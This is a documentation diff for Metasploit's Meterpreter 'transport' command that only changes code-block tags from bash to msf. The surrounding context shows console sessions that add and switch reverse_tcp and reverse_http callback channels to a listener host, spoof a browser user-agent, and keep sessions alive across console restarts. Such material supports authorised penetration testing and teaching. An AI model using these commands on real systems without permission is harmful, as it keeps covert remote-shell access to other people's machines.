@@ -26,7 +26,7 @@ Meterpreter has a new base command called `transport`. This is the hub of all tr
 
 The following output shows the current help text for the `transport` command:
 
-```bash
+```msf
 meterpreter > transport
 Usage: transport <list|change|add|next|prev|remove> [options]
 
@@ -65,7 +65,7 @@ OPTIONS:
 
 The simplest of all the sub-commands in the `transport` set is `list`. This command shows the full list of currently enabled transport, and an indicator of which one is the "current" transport. The following shows the non-verbose output with just the default transport running:
 
-```bash
+```msf
 meterpreter > transport list
 Session Expiry  : @ 2015-06-09 19:56:05
 
@@ -82,7 +82,7 @@ The above output shows that we have one transport enabled that is using `TCP`. W
 
 The verbose version of this command shows more detail about the transport, but only in cases where extra detail is available (such as `reverse_http/s`). The following command shows the output of the `list` sub-command with the verbose flag (`-v`) after an `HTTP` transport has been added:
 
-```bash
+```msf
 meterpreter > transport list -v
 Session Expiry  : @ 2015-06-09 19:56:05
 
@@ -98,7 +98,7 @@ Adding transports gives Meterpreter the ability to work on different transport m
 
 The following command shows a simple example that adds a `reverse_http` transport to an existing Meterpreter session. It specifies a custom communications timeout, retry total and retry wait, and also specifies a custom user-agent string to be used for the HTTP requests:
 
-```bash
+```msf
 meterpreter > transport add -t reverse_http -l 10.1.10.40 -p 5105 -T 50000 -W 2500 -C 100000 -A "Totes-Legit Browser/1.1"
 [*] Adding new transport ...
 [+] Successfully added reverse_http transport.
@@ -127,7 +127,7 @@ It is also possible to specify the following:
 
 The following shows another example which adds another `reverse_tcp` transport to the transport list:
 
-```bash
+```msf
 meterpreter > transport add -t reverse_tcp -l 10.1.10.40 -p 5005
 [*] Adding new transport ...
 [+] Successfully added reverse_tcp transport.
@@ -155,7 +155,7 @@ The three different ways to change transports are:
 
 As an example, here is the current transport setup:
 
-```bash
+```msf
 meterpreter > transport list
 Session Expiry  : @ 2015-06-09 19:56:05
 
@@ -168,7 +168,7 @@ Session Expiry  : @ 2015-06-09 19:56:05
 
 Moving to the next transport:
 
-```bash
+```msf
 meterpreter > transport next
 [*] Changing to next transport ...
 [+] Successfully changed to the next transport, killing current session.
@@ -195,7 +195,7 @@ This output shows that we moved from the original `reverse_tcp` to the `reverse_
 
 Moving to the next transport again takes the session to the second `reverse_tcp` listener:
 
-```bash
+```msf
 meterpreter > transport next
 [*] Changing to next transport ...
 [+] Successfully changed to the next transport, killing current session.
@@ -218,7 +218,7 @@ Session Expiry  : @ 2015-06-09 19:56:06
 
 From here, moving backward sends Meterpreter back to the `reverse_http` listener:
 
-```bash
+```msf
 meterpreter > transport prev
 [*] Changing to previous transport ...
 
@@ -252,7 +252,7 @@ The command is similar to `add` in that it takes a subset of the parameters, and
 * `-p` - The `LPORT` value.
 * `-u` - This value is only required for `reverse_http/s` transports and needs to contain the URI of the transport in question. This is important because there might be multiple listeners on the same IP and port, so the URI is what differentiates each of the sessions.
 
-```bash
+```msf
 [*] Starting interaction with 2...
 
 meterpreter > transport list
@@ -282,7 +282,7 @@ Previously, Meterpreter only had built-in resiliency in the `HTTP/S` payloads an
 
 The following shows Metasploit being closed and leaving the existing `TCP` session running behind the scenes:
 
-```bash
+```msf
 meterpreter > transport list
 Session Expiry  : @ 2015-06-09 19:56:05
 
@@ -301,7 +301,7 @@ With Metasploit closed, the Meterpreter session has detected that the transport 
 
 The following output shows Metasploit being re-launched with the appropriate listeners, and the existing Meterpreter instance establishing a session automatically:
 
-```bash
+```msf
 ./msfconsole -r ~/msf.rc
 [*] Starting the Metasploit Framework console...|
 IIIIII    dTb.dTb        _.---._
